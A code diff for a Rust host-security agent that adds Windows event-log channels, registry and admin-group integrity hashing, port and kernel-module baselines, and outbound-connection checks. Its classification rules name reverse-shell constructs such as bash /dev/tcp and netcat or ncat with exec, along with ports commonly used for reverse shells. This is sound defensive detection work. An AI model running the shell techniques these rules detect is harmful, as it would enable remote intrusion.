@@ -24,11 +24,31 @@
 //! output for. Identical on both platforms -- the control plane's ingest,
 //! correlation, and UI code needs zero changes either way.
 
+use std::net::IpAddr;
+
 use abyssal_agent_protocol::{CommandOutcome, OperationOutput};
 
 use crate::elevation::ElevationState;
 #[cfg(unix)]
 use crate::process::command_exists;
+
+/// True for a private (RFC 1918), loopback, or link-local address --
+/// shared by both platforms' outbound-connection gathering (Phase 8) to
+/// filter out ordinary internal/local traffic before it's ever even
+/// formatted, let alone classified. `Ipv4Addr::is_private`/`is_loopback`/
+/// `is_link_local` are all stable std; IPv6 has no stable-std equivalent
+/// for the private (`fc00::/7`, unique local) or link-local (`fe80::/10`)
+/// ranges, so those two are checked by hand against the first 16 bits.
+fn is_private_or_loopback(ip: &IpAddr) -> bool {
+    match ip {
+        IpAddr::V4(v4) => v4.is_private() || v4.is_loopback() || v4.is_link_local(),
+        IpAddr::V6(v6) => {
+            v6.is_loopback()
+                || (v6.segments()[0] & 0xfe00) == 0xfc00
+                || (v6.segments()[0] & 0xffc0) == 0xfe80
+        }
+    }
+}
 
 #[cfg(unix)]
 const TAIL_LINES: &str = "500";
@@ -56,13 +76,12 @@ const KERNEL_LOG_CANDIDATES: &[(&str, &str)] = &[("/var/log/kern.log", "kern.log
 
 /// Small, fixed set of security-sensitive files hashed on every scan --
 /// lightweight file-integrity monitoring, not a general-purpose file
-/// scanner. Kept as a hardcoded list rather than control-plane-configurable
-/// for now: doing that properly would mean carrying a path list on the
-/// wire (`AgentOperation::ScanSecurityEvents` is a bare unit variant
-/// today), which bumps `PROTOCOL_VERSION` and touches both dispatch call
-/// sites -- a bigger change than this pass's scope. The agent stays
-/// stateless either way; comparison against the last-known hash happens
-/// entirely control-plane-side (`repo::thanatos_file_hashes`).
+/// scanner. Always hashed regardless of whatever admin-configured
+/// `extra_fim_paths` (Phase 7b) also arrive on a given scan -- this is
+/// the baseline every host gets, not something an admin can accidentally
+/// lose by clearing the configurable list. The agent stays stateless
+/// either way; comparison against the last-known hash happens entirely
+/// control-plane-side (`repo::thanatos_file_hashes`).
 #[cfg(unix)]
 const FIM_WATCHLIST: &[&str] = &[
     "/etc/passwd",
@@ -94,13 +113,17 @@ const JOURNAL_SOURCES: &[JournalSource] = &[
     JournalSource::Unit("systemd-logind"),
 ];
 
-/// Windows Security-log event IDs Thanatos watches for, chosen to mirror
-/// what the Linux auth-log path already watches: failed/successful
-/// logons, account creation, and privileged group membership changes.
-/// 4688 (process creation) is deliberately not queried by ID at all --
-/// see the `RULES` doc comment below for why.
+/// Windows Security-log event IDs Thanatos watches for (Phase 4 baseline
+/// plus Phase 6's broader coverage): failed/successful logons, explicit-
+/// credential logons (lateral movement/"runas"), privileged-logon use,
+/// account/service/scheduled-task creation and privileged group
+/// membership changes, audit-policy tampering, lockouts, and audit-log
+/// clearing. 4688 (process creation) is deliberately not queried by ID
+/// at all -- see the `RULES` doc comment below for why.
 #[cfg(windows)]
-const WINDOWS_SECURITY_EVENT_IDS: &[u32] = &[4624, 4625, 4720, 4732];
+const WINDOWS_SECURITY_EVENT_IDS: &[u32] = &[
+    4624, 4625, 4648, 4672, 4697, 4698, 4699, 4700, 4701, 4702, 4719, 4720, 4732, 4740, 1102,
+];
 
 /// Windows System-log signals: repeated service-start failures/hangs and
 /// an unexpected shutdown -- the closest analog available from the event
@@ -111,15 +134,106 @@ const WINDOWS_SECURITY_EVENT_IDS: &[u32] = &[4624, 4625, 4720, 4732];
 #[cfg(windows)]
 const WINDOWS_SYSTEM_EVENT_IDS: &[u32] = &[6008, 7000, 7009, 7011];
 
-/// Hashed on every scan, mirroring Linux's `FIM_WATCHLIST`. Windows has
-/// no single flat-file analog to /etc/passwd or /etc/sudoers -- local
-/// account/group state lives in the binary, normally-locked SAM
-/// database, not a hashable text file -- so this is deliberately just
-/// the one genuine equivalent: the hosts file, a classic tampering
-/// target for traffic redirection, same as /etc/hosts would be if
-/// Linux's own watch-list included it.
+/// Additional log channels beyond Security/System (Phase 6b), each
+/// populated only if the host's audit policy actually enables it --
+/// same "best-effort, silently nothing if absent" caveat 4688 process-
+/// creation auditing already carries. `Microsoft-Windows-PowerShell/
+/// Operational` needs Script Block Logging turned on via policy (off by
+/// default); `Microsoft-Windows-Windows Defender/Operational` is only
+/// populated if Defender is the active AV (usually is, by default,
+/// unless replaced by third-party AV). Sysmon-sourced events are
+/// deliberately excluded -- Sysmon isn't installed by default on any
+/// Windows edition, a materially bigger assumption than "this built-in
+/// audit policy happens to be enabled," consistent with the "no eBPF"
+/// line already drawn for Linux.
 #[cfg(windows)]
-const WINDOWS_FIM_WATCHLIST: &str = r"C:\Windows\System32\drivers\etc\hosts";
+const WINDOWS_EXTRA_CHANNELS: &[(&str, &str, &[u32])] = &[
+    (
+        "Microsoft-Windows-PowerShell/Operational",
+        "powershell",
+        &[4104],
+    ),
+    (
+        "Microsoft-Windows-Windows Defender/Operational",
+        "defender",
+        &[1116, 5001],
+    ),
+];
+
+/// One Windows FIM watch item: a stable identifier (used as the `path`
+/// column in `thanatos_file_hashes` -- not necessarily a real filesystem
+/// path, the registry/local-group entries below are synthetic
+/// identifiers instead) plus the PowerShell expression that captures its
+/// current content as text. Every item is hashed the same uniform way
+/// (`windows_fim_hash_script`, below) regardless of whether the content
+/// came from a file, the registry, or a group membership list -- unlike
+/// Phase 4's single hosts-file item, which used `Get-FileHash` directly
+/// since a file was the only kind of item that existed yet.
+#[cfg(windows)]
+struct WindowsFimItem {
+    identifier: &'static str,
+    capture_expr: &'static str,
+}
+
+/// Mirrors Linux's `FIM_WATCHLIST`, broadened in Phase 6 beyond the
+/// single hosts-file item Phase 4 shipped. Windows has no single
+/// flat-file analog to /etc/passwd or /etc/sudoers -- local account
+/// state lives in the binary, normally-locked SAM database, not a
+/// hashable text file -- so the other two items below are the closest
+/// real equivalents instead: a machine-wide persistence location, and a
+/// privileged-group membership snapshot.
+#[cfg(windows)]
+const WINDOWS_FIM_WATCHLIST: &[WindowsFimItem] = &[
+    WindowsFimItem {
+        identifier: r"C:\Windows\System32\drivers\etc\hosts",
+        capture_expr: "(Get-Content -Raw -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -ErrorAction SilentlyContinue)",
+    },
+    // Deliberately HKLM only, not HKCU: the agent/service runs as
+    // `LocalSystem`, whose own HKCU is a never-used-for-real-persistence
+    // profile hive, not any interactively logged-in user's -- monitoring
+    // a real user's HKCU\...\Run would need enumerating and loading
+    // every other user profile's offline NTUSER.DAT hive under
+    // HKEY_USERS, a substantially bigger and more fragile piece of work
+    // than this pass's scope. Documented as a known gap, not silently
+    // dropped. `Sort-Object` guards against registry enumeration order
+    // not being a stable property to hash across scans the way whole-
+    // file content is -- an unsorted hash risks a spurious "changed"
+    // finding from nothing but reordering, not a real change.
+    WindowsFimItem {
+        identifier: r"HKLM\...\CurrentVersion\Run(Once)",
+        capture_expr: "(@('HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', \
+             'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce') | ForEach-Object { \
+             $key = $_; Get-ItemProperty -Path $key -ErrorAction SilentlyContinue } | \
+             ForEach-Object { $_.PSObject.Properties } | Where-Object { $_.Name -notmatch '^PS' } | \
+             ForEach-Object { \"$($_.Name)=$($_.Value)\" } | Sort-Object)",
+    },
+    WindowsFimItem {
+        identifier: "local-group:Administrators",
+        capture_expr: "(Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | \
+             Select-Object -ExpandProperty Name | Sort-Object)",
+    },
+];
+
+/// Wraps a PowerShell expression that yields either a single string or
+/// an array of strings, joins/hashes it in .NET directly (SHA-256, hex,
+/// lowercased to match Linux's `sha256sum` convention), and prints just
+/// the hash -- one uniform hashing step shared by every
+/// `WindowsFimItem`, whatever kind of content it captures. Prints
+/// nothing (not even an empty line) when the captured content is empty/
+/// unavailable, so the caller can tell "nothing to hash" apart from "an
+/// all-zero-length file" without a separate existence check.
+#[cfg(windows)]
+fn windows_fim_hash_script(capture_expr: &str) -> String {
+    format!(
+        "$content = {capture_expr}; \
+         if ($content) {{ \
+           $joined = ($content -join \"`n\"); \
+           $bytes = [System.Text.Encoding]::UTF8.GetBytes($joined); \
+           $hashBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes); \
+           Write-Output ([System.BitConverter]::ToString($hashBytes).Replace('-', '').ToLower()) \
+         }}"
+    )
+}
 
 /// Ordered, first-match-wins classification rules: (substring, severity,
 /// label). Order is load-bearing -- specific patterns before general ones,
@@ -191,6 +305,24 @@ const RULES: &[(&str, &str, &str)] = &[
     // failed failed ..."), a distinctive enough pair of words that it's
     // very unlikely to appear in an unrelated log line.
     ("failed failed", "medium", "systemd unit failed"),
+    // ---- Process command-line signals (Phase 7). Matched against every
+    // running process's own command line (source "process"), not a
+    // process-list diff -- see `scan_security_events`'s own comment on
+    // why. Deliberately a small, high-confidence set: constructs that
+    // are essentially never legitimate rather than broad heuristics that
+    // would false-positive on ordinary admin/scripting activity.
+    (
+        "/dev/tcp/",
+        "high",
+        "Possible reverse shell (bash /dev/tcp construct)",
+    ),
+    ("nc -e", "high", "Possible reverse shell (netcat -e)"),
+    (
+        "ncat --exec",
+        "high",
+        "Possible reverse shell (ncat --exec)",
+    ),
+    ("ncat -e", "high", "Possible reverse shell (ncat -e)"),
     // ---- Windows Security/System event log signals (Phase 4). Matched
     // on the `EventID=<n>` marker the Windows scan path embeds in each
     // line, never on the event's own message text: that text is
@@ -227,6 +359,84 @@ const RULES: &[(&str, &str, &str)] = &[
     ("EventID=7000", "medium", "Windows service failed to start"),
     ("EventID=7009", "medium", "Windows service failed to start"),
     ("EventID=7011", "medium", "Windows service control timeout"),
+    // ---- Phase 6: broader Windows Security-log coverage, same
+    // EventID-marker-matching reasoning as above. `-EncodedCommand`/
+    // `FromBase64String` above already cover event 4104 (PowerShell
+    // script block logging, `WINDOWS_EXTRA_CHANNELS`) for free -- a
+    // logged script block containing either pattern matches the same
+    // rule regardless of which log line it came from, so no separate
+    // 4104 rule is needed.
+    (
+        "EventID=4648",
+        "high",
+        "Explicit-credential logon (possible lateral movement)",
+    ),
+    (
+        "EventID=4672",
+        "medium",
+        "Privileged logon (admin/SYSTEM-level)",
+    ),
+    ("EventID=4697", "high", "Windows service installed"),
+    ("EventID=4698", "medium", "Scheduled task created"),
+    ("EventID=4699", "medium", "Scheduled task deleted"),
+    ("EventID=4700", "medium", "Scheduled task enabled"),
+    ("EventID=4701", "medium", "Scheduled task disabled"),
+    ("EventID=4702", "medium", "Scheduled task updated"),
+    (
+        "EventID=4719",
+        "high",
+        "System audit policy changed (possible log tampering)",
+    ),
+    ("EventID=4740", "low", "Windows account locked out"),
+    (
+        "EventID=1102",
+        "high",
+        "Windows audit log was cleared (anti-forensics)",
+    ),
+    // Windows Defender (`WINDOWS_EXTRA_CHANNELS`) -- populated only if
+    // Defender is the active AV.
+    ("EventID=1116", "high", "Windows Defender detected malware"),
+    (
+        "EventID=5001",
+        "high",
+        "Windows Defender real-time protection disabled",
+    ),
+    // ---- Phase 8: established outbound connections to a remote port
+    // long associated with reverse-shells/C2 (source "network-outbound",
+    // both platforms). Matched on an exact `remote_port=<n>` marker --
+    // never on "any unusual port," deliberately: outbound connections to
+    // brand-new external IPs/ports are completely ordinary traffic (CDN
+    // edges, load-balanced service pools), unlike a new *listening*
+    // port, so this stays a short, high-confidence list rather than a
+    // broad heuristic that would flag normal browsing/API traffic.
+    // Private/loopback/link-local destinations are filtered out before
+    // a line is ever formatted (`is_private_or_loopback`), so these only
+    // ever match genuinely external connections.
+    (
+        "remote_port=4444",
+        "high",
+        "Outbound connection to a well-known reverse-shell port",
+    ),
+    (
+        "remote_port=1337",
+        "high",
+        "Outbound connection to a well-known reverse-shell port",
+    ),
+    (
+        "remote_port=31337",
+        "high",
+        "Outbound connection to a well-known reverse-shell port",
+    ),
+    (
+        "remote_port=6666",
+        "high",
+        "Outbound connection to a well-known reverse-shell port",
+    ),
+    (
+        "remote_port=6667",
+        "high",
+        "Outbound connection to a well-known reverse-shell port",
+    ),
 ];
 
 fn classify(line: &str) -> Option<(&'static str, &'static str)> {
@@ -236,8 +446,156 @@ fn classify(line: &str) -> Option<(&'static str, &'static str)> {
         .map(|(_, severity, label)| (*severity, *label))
 }
 
+/// Extracts the port from a `ss`/`netstat` listing line's local-address
+/// field (both put it at the same whitespace-split index once `netstat`'s
+/// two-line header is filtered out by the caller) -- `rsplit(':')` rather
+/// than `split(':')` so an IPv6 local address (`[::]:22`, itself
+/// colon-heavy) still yields just the trailing port.
 #[cfg(unix)]
-pub async fn scan_security_events(elevation: &ElevationState) -> CommandOutcome {
+fn parse_listening_port(line: &str, field_index: usize) -> Option<&str> {
+    line.split_whitespace().nth(field_index)?.rsplit(':').next()
+}
+
+/// Current TCP/UDP listening ports, normalized to `"tcp:<port>"`/
+/// `"udp:<port>"` (the same `port_key` shape the Windows implementation
+/// below produces, so the control-plane baseline table doesn't need to
+/// know which platform a key came from). Prefers `ss` (iproute2, present
+/// on essentially every modern distro); falls back to `netstat` for
+/// older systems, matching `firewall.rs`'s own "detect the tool present"
+/// convention. Best-effort throughout -- a missing/failed tool just
+/// means no port findings this scan, not a scan failure.
+#[cfg(unix)]
+async fn linux_listening_ports(elevation: &ElevationState) -> Vec<String> {
+    let mut ports = Vec::new();
+    if command_exists("ss").await {
+        for (proto, flag) in [("tcp", "-tlnH"), ("udp", "-ulnH")] {
+            if let Ok(output) = elevation.run_allow_failure("ss", &[flag]).await
+                && output.exit_code == Some(0)
+            {
+                for line in output.stdout.lines() {
+                    if let Some(port) = parse_listening_port(line, 3) {
+                        ports.push(format!("{proto}:{port}"));
+                    }
+                }
+            }
+        }
+    } else {
+        for (proto, flag) in [("tcp", "-tln"), ("udp", "-uln")] {
+            if let Ok(output) = elevation.run_allow_failure("netstat", &[flag]).await
+                && output.exit_code == Some(0)
+            {
+                for line in output.stdout.lines() {
+                    let starts_with_proto = line
+                        .trim_start()
+                        .get(..proto.len())
+                        .is_some_and(|prefix| prefix.eq_ignore_ascii_case(proto));
+                    if !starts_with_proto {
+                        continue;
+                    }
+                    if let Some(port) = parse_listening_port(line, 3) {
+                        ports.push(format!("{proto}:{port}"));
+                    }
+                }
+            }
+        }
+    }
+    ports.sort();
+    ports.dedup();
+    ports
+}
+
+/// Splits a `ss`/`netstat` remote-address field (`"203.0.113.9:4444"`,
+/// or a bracketed IPv6 form like `"[2001:db8::1]:4444"`) into its
+/// address and port, at the *last* colon so an unbracketed IPv6 address
+/// (itself colon-heavy) still splits correctly. `field_index` is 4 for
+/// both tools' established-connection output (`ss -tn state
+/// established`'s Peer Address:Port column, and `netstat -tn`'s Foreign
+/// Address column -- the same index Phase 7a's `parse_listening_port`
+/// used for *local* address on a *listening*-socket line, since that's
+/// a structurally different column position).
+#[cfg(unix)]
+fn parse_remote_addr_port(line: &str, field_index: usize) -> Option<(IpAddr, u16)> {
+    let field = line.split_whitespace().nth(field_index)?;
+    let port_start = field.rfind(':')?;
+    let addr_str = field[..port_start]
+        .trim_start_matches('[')
+        .trim_end_matches(']');
+    let ip: IpAddr = addr_str.parse().ok()?;
+    let port: u16 = field[port_start + 1..].parse().ok()?;
+    Some((ip, port))
+}
+
+#[cfg(unix)]
+fn push_outbound_connection_line(lines: &mut Vec<String>, line: &str, field_index: usize) {
+    if let Some((ip, port)) = parse_remote_addr_port(line, field_index)
+        && !is_private_or_loopback(&ip)
+    {
+        lines.push(format!("remote_port={port}\tremote_addr={ip}\tproto=tcp"));
+    }
+}
+
+/// Current established TCP connections to a *non-private, non-loopback*
+/// remote address, formatted as `remote_port=<n>\tremote_addr=<ip>\t
+/// proto=tcp` lines for `classify()` to match against (Phase 8) -- see
+/// `RULES`' own doc comment for why this is a `classify()` source and
+/// not a baseline-diff table the way listening ports are. Same "prefer
+/// `ss`, fall back to `netstat`" shape as `linux_listening_ports`.
+#[cfg(unix)]
+async fn linux_outbound_connections(elevation: &ElevationState) -> Vec<String> {
+    let mut lines = Vec::new();
+    if command_exists("ss").await {
+        if let Ok(output) = elevation
+            .run_allow_failure("ss", &["-tn", "-H", "state", "established"])
+            .await
+            && output.exit_code == Some(0)
+        {
+            for line in output.stdout.lines() {
+                push_outbound_connection_line(&mut lines, line, 4);
+            }
+        }
+    } else if let Ok(output) = elevation.run_allow_failure("netstat", &["-tn"]).await
+        && output.exit_code == Some(0)
+    {
+        for line in output.stdout.lines() {
+            let lower = line.trim_start().to_ascii_lowercase();
+            if !lower.starts_with("tcp") || !lower.contains("established") {
+                continue;
+            }
+            push_outbound_connection_line(&mut lines, line, 4);
+        }
+    }
+    lines
+}
+
+/// Currently loaded kernel module names (Phase 9), from `lsmod`'s first
+/// whitespace column of every line after its own header row. A newly-
+/// loaded module a scan-to-scan comparison hasn't seen before is exactly
+/// the kind of rootkit/kernel-level-persistence signal a healthy host's
+/// naturally stable module set makes low-noise to alert on -- unlike
+/// Phase 8's outbound connections, this genuinely is a baseline-diff
+/// case, the same shape as `linux_listening_ports`'s own set-membership
+/// tracking (see `thanatos_kernel_module_baseline`'s doc comment
+/// control-plane-side for the reconciliation logic).
+#[cfg(unix)]
+async fn linux_kernel_modules(elevation: &ElevationState) -> Vec<String> {
+    let mut modules = Vec::new();
+    if let Ok(output) = elevation.run_allow_failure("lsmod", &[]).await
+        && output.exit_code == Some(0)
+    {
+        for line in output.stdout.lines().skip(1) {
+            if let Some(name) = line.split_whitespace().next() {
+                modules.push(name.to_string());
+            }
+        }
+    }
+    modules
+}
+
+#[cfg(unix)]
+pub async fn scan_security_events(
+    elevation: &ElevationState,
+    extra_fim_paths: Vec<String>,
+) -> CommandOutcome {
     let mut lines_with_source: Vec<(&'static str, String)> = Vec::new();
 
     // ---- Auth/login sources: a flat log file, or journalctl only if
@@ -343,6 +701,32 @@ pub async fn scan_security_events(elevation: &ElevationState) -> CommandOutcome 
         }
     }
 
+    // ---- Process command lines: independent of everything above --
+    // fed through the same classify() pass as every log source (source
+    // "process"), not diffed -- see `RULES`'s "Process command-line
+    // signals" comment for why. `-eo args` (not `-ef --forest`, which
+    // Reanimation's own process listing uses) keeps each line to just
+    // the command itself, no tree-drawing characters or extra columns
+    // to pollute substring matching.
+    if let Ok(output) = elevation
+        .run_allow_failure("ps", &["-eo", "args", "--no-headers"])
+        .await
+        && output.exit_code == Some(0)
+    {
+        for line in output.stdout.lines() {
+            if !line.trim().is_empty() {
+                lines_with_source.push(("process", line.to_string()));
+            }
+        }
+    }
+
+    // ---- Established outbound connections to a non-private remote
+    // address: independent of everything above -- see
+    // `linux_outbound_connections`'s and `RULES`' own doc comments.
+    for line in linux_outbound_connections(elevation).await {
+        lines_with_source.push(("network-outbound", line));
+    }
+
     let scanned = lines_with_source.len();
     let mut stdout = String::new();
     let mut matched_count = 0usize;
@@ -355,14 +739,38 @@ pub async fn scan_security_events(elevation: &ElevationState) -> CommandOutcome 
 
     // File-integrity watch-list -- always attempted, independent of
     // whether any log source above was readable at all (hashing a file
-    // has nothing to do with log availability).
-    for path in FIM_WATCHLIST {
+    // has nothing to do with log availability). `extra_fim_paths`
+    // (Phase 7b) are admin-configured, additive to -- never a
+    // replacement for -- the fixed watch-list above; re-validated here
+    // even though the control plane already checked them, same "never
+    // trusts a wire value" rule every other operation follows.
+    let extra_fim_paths: Vec<&str> = extra_fim_paths
+        .iter()
+        .map(String::as_str)
+        .filter(|p| abyssal_agent_protocol::is_valid_absolute_path(p))
+        .collect();
+    for path in FIM_WATCHLIST.iter().copied().chain(extra_fim_paths) {
         if let Ok(output) = elevation.run_allow_failure("sha256sum", &[path]).await
             && output.exit_code == Some(0)
             && let Some(hash) = output.stdout.split_whitespace().next()
         {
             stdout.push_str(&format!("fim\t{path}\t{hash}\n"));
         }
+    }
+
+    // Listening ports -- always attempted, reported fresh every scan
+    // (the control plane does the new-port diffing, same "stateless
+    // agent" split FIM already uses; see `thanatos_network_baseline`'s
+    // doc comment control-plane-side).
+    for port_key in linux_listening_ports(elevation).await {
+        stdout.push_str(&format!("port\t{port_key}\n"));
+    }
+
+    // Loaded kernel modules -- same "agent reports the full current
+    // set, control plane diffs it" split as listening ports; see
+    // `linux_kernel_modules`'s own doc comment.
+    for module_key in linux_kernel_modules(elevation).await {
+        stdout.push_str(&format!("module\t{module_key}\n"));
     }
 
     if matched_count == 0 {
@@ -396,13 +804,23 @@ pub async fn scan_security_events(elevation: &ElevationState) -> CommandOutcome 
 /// `LocalSystem` (see `crates/agent/src/winservice.rs`), which already
 /// has full Event Log read access.
 #[cfg(windows)]
-pub async fn scan_security_events(_elevation: &ElevationState) -> CommandOutcome {
+pub async fn scan_security_events(
+    _elevation: &ElevationState,
+    extra_fim_paths: Vec<String>,
+) -> CommandOutcome {
     let mut lines_with_source: Vec<(&'static str, String)> = Vec::new();
 
-    for (log_name, source, ids) in [
+    let mut channels: Vec<(&str, &str, &[u32])> = vec![
         ("Security", "security", WINDOWS_SECURITY_EVENT_IDS),
         ("System", "system", WINDOWS_SYSTEM_EVENT_IDS),
-    ] {
+    ];
+    channels.extend(
+        WINDOWS_EXTRA_CHANNELS
+            .iter()
+            .map(|(log_name, source, ids)| (*log_name, *source, *ids)),
+    );
+
+    for (log_name, source, ids) in channels {
         let id_list = ids.iter().map(u32::to_string).collect::<Vec<_>>().join(",");
         // `-replace '\r?\n', ' '` flattens the (often multi-line)
         // Message property to one line, since the outer wire format is
@@ -433,6 +851,55 @@ pub async fn scan_security_events(_elevation: &ElevationState) -> CommandOutcome
         }
     }
 
+    // Process command lines -- fed through the same classify() pass as
+    // every event-log source (source "process"), not diffed. Plain
+    // `Get-Process` doesn't expose a command line; `Win32_Process` does.
+    let process_script = "Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | \
+         Select-Object -ExpandProperty CommandLine";
+    if let Ok(output) = crate::process::run_command(
+        "powershell.exe",
+        &["-NoProfile", "-NonInteractive", "-Command", process_script],
+    )
+    .await
+    {
+        for line in output.stdout.lines() {
+            if !line.trim().is_empty() {
+                lines_with_source.push(("process", line.to_string()));
+            }
+        }
+    }
+
+    // Established outbound connections to a non-private remote address
+    // -- see `RULES`' own doc comment for why this is a classify()
+    // source, not a baseline-diff table. `-ErrorAction SilentlyContinue`
+    // per-cmdlet since a `-State Established` filter finding nothing is
+    // completely normal, not a failure worth surfacing. The private/
+    // loopback filter runs agent-side (`is_private_or_loopback`, shared
+    // with the Linux path) rather than in PowerShell, so both platforms
+    // use the exact same range logic.
+    let outbound_script = "Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | \
+         ForEach-Object { \"$($_.RemoteAddress)`t$($_.RemotePort)\" }";
+    if let Ok(output) = crate::process::run_command(
+        "powershell.exe",
+        &["-NoProfile", "-NonInteractive", "-Command", outbound_script],
+    )
+    .await
+    {
+        for line in output.stdout.lines() {
+            let mut parts = line.splitn(2, '\t');
+            if let (Some(addr_str), Some(port_str)) = (parts.next(), parts.next())
+                && let Ok(ip) = addr_str.trim().parse::<IpAddr>()
+                && let Ok(port) = port_str.trim().parse::<u16>()
+                && !is_private_or_loopback(&ip)
+            {
+                lines_with_source.push((
+                    "network-outbound",
+                    format!("remote_port={port}\tremote_addr={ip}\tproto=tcp"),
+                ));
+            }
+        }
+    }
+
     let scanned = lines_with_source.len();
     let mut stdout = String::new();
     let mut matched_count = 0usize;
@@ -444,34 +911,96 @@ pub async fn scan_security_events(_elevation: &ElevationState) -> CommandOutcome
     }
 
     // File-integrity watch-list -- see `WINDOWS_FIM_WATCHLIST`'s doc
-    // comment for why this is just the one path, unlike Linux's four.
-    let hash_script = format!(
-        "(Get-FileHash -Algorithm SHA256 -Path '{WINDOWS_FIM_WATCHLIST}' \
-         -ErrorAction SilentlyContinue).Hash"
-    );
+    // comment for what each item captures and why it's hashed uniformly.
+    for item in WINDOWS_FIM_WATCHLIST {
+        let hash_script = windows_fim_hash_script(item.capture_expr);
+        if let Ok(output) = crate::process::run_command(
+            "powershell.exe",
+            &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
+        )
+        .await
+        {
+            let hash = output.stdout.trim();
+            if !hash.is_empty() {
+                stdout.push_str(&format!("fim\t{}\t{hash}\n", item.identifier));
+            }
+        }
+    }
+
+    // Admin-configured extra paths (Phase 7b) -- additive to the fixed
+    // watch-list above, re-validated here even though the control plane
+    // already checked them (see `AgentOperation::ScanSecurityEvents`'s
+    // own doc comment).
+    for path in &extra_fim_paths {
+        if !abyssal_agent_protocol::is_valid_windows_absolute_path(path) {
+            continue;
+        }
+        let capture_expr = format!(
+            "(Get-Content -Raw -Path {} -ErrorAction SilentlyContinue)",
+            crate::process::ps_quote(path)
+        );
+        let hash_script = windows_fim_hash_script(&capture_expr);
+        if let Ok(output) = crate::process::run_command(
+            "powershell.exe",
+            &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
+        )
+        .await
+        {
+            let hash = output.stdout.trim();
+            if !hash.is_empty() {
+                stdout.push_str(&format!("fim\t{path}\t{hash}\n"));
+            }
+        }
+    }
+
+    // Listening ports -- reported fresh every scan, normalized to the
+    // same `"tcp:<port>"`/`"udp:<port>"` shape `linux_listening_ports`
+    // produces (see that function's doc comment for why the control
+    // plane does the diffing, not the agent).
+    let port_script = "$tcp = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | \
+         ForEach-Object { \"tcp:$($_.LocalPort)\" }; \
+         $udp = Get-NetUDPEndpoint -ErrorAction SilentlyContinue | \
+         ForEach-Object { \"udp:$($_.LocalPort)\" }; \
+         ($tcp + $udp) | Sort-Object -Unique";
     if let Ok(output) = crate::process::run_command(
         "powershell.exe",
-        &["-NoProfile", "-NonInteractive", "-Command", &hash_script],
+        &["-NoProfile", "-NonInteractive", "-Command", port_script],
     )
     .await
     {
-        let hash = output.stdout.trim();
-        if !hash.is_empty() {
-            // Lowercased to match Linux's `sha256sum` output convention
-            // (Get-FileHash returns uppercase hex) -- purely cosmetic
-            // consistency, since each host's baseline is compared only
-            // against its own prior scans, never cross-host.
-            stdout.push_str(&format!(
-                "fim\t{WINDOWS_FIM_WATCHLIST}\t{}\n",
-                hash.to_lowercase()
-            ));
+        for line in output.stdout.lines() {
+            let port_key = line.trim();
+            if !port_key.is_empty() {
+                stdout.push_str(&format!("port\t{port_key}\n"));
+            }
+        }
+    }
+
+    // Currently running drivers (Phase 9) -- the Windows analog of
+    // `linux_kernel_modules`: a malicious driver is exactly as real a
+    // rootkit vector on Windows as a malicious kernel module is on
+    // Linux, and a healthy host's set is naturally just as stable.
+    let driver_script = "Get-CimInstance Win32_SystemDriver -Filter \"State='Running'\" \
+         -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name";
+    if let Ok(output) = crate::process::run_command(
+        "powershell.exe",
+        &["-NoProfile", "-NonInteractive", "-Command", driver_script],
+    )
+    .await
+    {
+        for line in output.stdout.lines() {
+            let module_key = line.trim();
+            if !module_key.is_empty() {
+                stdout.push_str(&format!("module\t{module_key}\n"));
+            }
         }
     }
 
     if matched_count == 0 {
         let note = if scanned == 0 {
-            "No Security/System event log entries were readable for the watched event IDs \
-             (4624/4625/4720/4732 in Security, 6008/7000/7009/7011 in System)."
+            "No event log entries were readable for the watched event IDs (Security, System, \
+             and -- if enabled on this host -- PowerShell script block logging and Windows \
+             Defender's operational log)."
                 .to_string()
         } else {
             format!("Scanned {scanned} event(s); nothing matched the current detection rules.")
@@ -593,6 +1122,231 @@ mod tests {
         assert_eq!(
             classify("EventID=4688\tTime=2026-01-01T00:00:00.000Z\tcmd.exe /c whoami /priv"),
             None
+        );
+    }
+
+    #[test]
+    fn classifies_broader_windows_security_log_signals() {
+        assert_eq!(
+            classify(
+                "EventID=4648\tTime=2026-01-01T00:00:00.000Z\tA logon was attempted using explicit credentials."
+            ),
+            Some((
+                "high",
+                "Explicit-credential logon (possible lateral movement)"
+            ))
+        );
+        assert_eq!(
+            classify(
+                "EventID=4672\tTime=2026-01-01T00:00:00.000Z\tSpecial privileges assigned to new logon."
+            ),
+            Some(("medium", "Privileged logon (admin/SYSTEM-level)"))
+        );
+        assert_eq!(
+            classify(
+                "EventID=4697\tTime=2026-01-01T00:00:00.000Z\tA service was installed in the system."
+            ),
+            Some(("high", "Windows service installed"))
+        );
+        assert_eq!(
+            classify(
+                "EventID=4719\tTime=2026-01-01T00:00:00.000Z\tSystem audit policy was changed."
+            ),
+            Some((
+                "high",
+                "System audit policy changed (possible log tampering)"
+            ))
+        );
+        assert_eq!(
+            classify("EventID=1102\tTime=2026-01-01T00:00:00.000Z\tThe audit log was cleared."),
+            Some(("high", "Windows audit log was cleared (anti-forensics)"))
+        );
+        assert_eq!(
+            classify("EventID=4740\tTime=2026-01-01T00:00:00.000Z\tA user account was locked out."),
+            Some(("low", "Windows account locked out"))
+        );
+    }
+
+    #[test]
+    fn classifies_scheduled_task_lifecycle_events_distinctly() {
+        assert_eq!(
+            classify("EventID=4698\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was created."),
+            Some(("medium", "Scheduled task created"))
+        );
+        assert_eq!(
+            classify("EventID=4699\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was deleted."),
+            Some(("medium", "Scheduled task deleted"))
+        );
+        assert_eq!(
+            classify("EventID=4700\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was enabled."),
+            Some(("medium", "Scheduled task enabled"))
+        );
+        assert_eq!(
+            classify("EventID=4701\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was disabled."),
+            Some(("medium", "Scheduled task disabled"))
+        );
+        assert_eq!(
+            classify("EventID=4702\tTime=2026-01-01T00:00:00.000Z\tA scheduled task was updated."),
+            Some(("medium", "Scheduled task updated"))
+        );
+    }
+
